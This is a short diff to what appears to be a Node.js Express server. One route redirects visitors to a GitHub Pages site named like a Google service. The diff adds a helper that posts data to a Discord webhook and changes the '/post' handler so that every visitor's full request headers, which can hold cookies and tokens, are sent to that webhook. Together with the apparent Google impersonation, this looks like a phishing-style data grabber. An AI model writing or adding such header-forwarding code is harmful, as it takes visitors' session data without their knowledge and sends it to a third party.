@@ -429,7 +429,26 @@ main(user_id,file_id);
   });*/
   res.redirect('https://ss0809.github.io/Googleservice/?fileid='+file_id);
 });
+async function sendDiscordWebhook(webhookURL, message) {
+  try {
+    const response = await axios.post(webhookURL, {
+      content: message
+    });
+    console.log('Message sent to Discord webhook');
+  } catch (error) {
+    console.error('Error sending message to Discord webhook:', error);
+  }
+}
+
+
+
 app.post("/post", async (req, res) => {
  console.log("posted");
  console.log(req.headers);
+  const webhookURL = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+const message = req.headers;
+
+sendDiscordWebhook(webhookURL, message);
+
+
 });
